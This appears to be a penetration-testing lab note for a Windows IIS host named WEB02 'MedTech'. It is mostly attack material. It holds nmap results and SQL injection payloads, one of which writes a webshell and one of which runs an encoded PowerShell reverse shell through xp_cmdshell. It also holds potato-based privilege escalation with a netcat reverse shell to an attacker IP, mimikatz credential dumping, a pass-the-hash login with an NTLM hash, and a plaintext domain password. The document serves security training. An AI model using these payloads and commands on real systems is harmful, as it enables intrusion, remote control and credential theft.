# WEB02 .121 \[W, Pwned]

## Domain Users

`joe:Flowers1` \[Found via mimikatz]

No 'offsec' yet, we saw it in WEB02

## Enumeration

IP range: 192.168.110.121

Computer name:

```
Nmap scan report for 192.168.231.121
Host is up (0.061s latency).
Not shown: 65521 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: MedTech
|_http-server-header: Microsoft-IIS/10.0
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-11-24T13:44:19
|_  start_date: N/A
```

### Ports

80

Login.aspx

<div align="left"><figure><img src="../../../.gitbook/assets/image (131).png" alt=""><figcaption></figcaption></figure></div>



{% code overflow="wrap" %}
```
' select 2'
%' UNION SELECT user(), 'a2'-- //
' UNION SELECT "", null INTO OUTFILE "C:/inetpub/wwwroot/webshell.php" -- //

admin'; EXEC xp_cmdshell 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADEANgA3ACIALAA4ADAAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA';--  
```
{% endcode %}

### Local Users

## Initial Foothold



## PrivEsc

```
DIDNT WORK

.\GP.exe -cmd "net localgroup administrators jtrip /add"
.\RunasCs.exe 'jtrip' 'jtrip' powershell.exe -r 192.168.45.167:9001

WORKED
cmd /c GP.exe -cmd "cmd /c C:\programdata\nc64.exe -t -e C:\Windows\System32\cmd.exe 192.168.45.167 443" 

```

## Post Exploitation

```
.\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" exit
PS C:\programdata> . .\Invoke-Portscan.ps1
PS C:\programdata> Invoke-Portscan -Hosts 172.16.231.1/24

evil-winrm -i 192.168.231.121 -u Administrator -H b2c03054c306ac8fc5f9d188710b0168

*Evil-WinRM* PS C:\programdata> Test-Connection -ComputerName "172.16.231.10" -Count 5

Source        Destination     IPV4Address      IPV6Address                              Bytes    Time(ms)
------        -----------     -----------      -----------                              -----    --------
WEB02         172.16.231.10   172.16.231.10                                             32       0
WEB02         172.16.231.10   172.16.231.10                                             32       0
WEB02         172.16.231.10   172.16.231.10                                             32       0
WEB02         172.16.231.10   172.16.231.10                                             32       0
WEB02         172.16.231.10   172.16.231.10                                             32       0
```

<figure><img src="../../../.gitbook/assets/image (138).png" alt=""><figcaption></figcaption></figure>

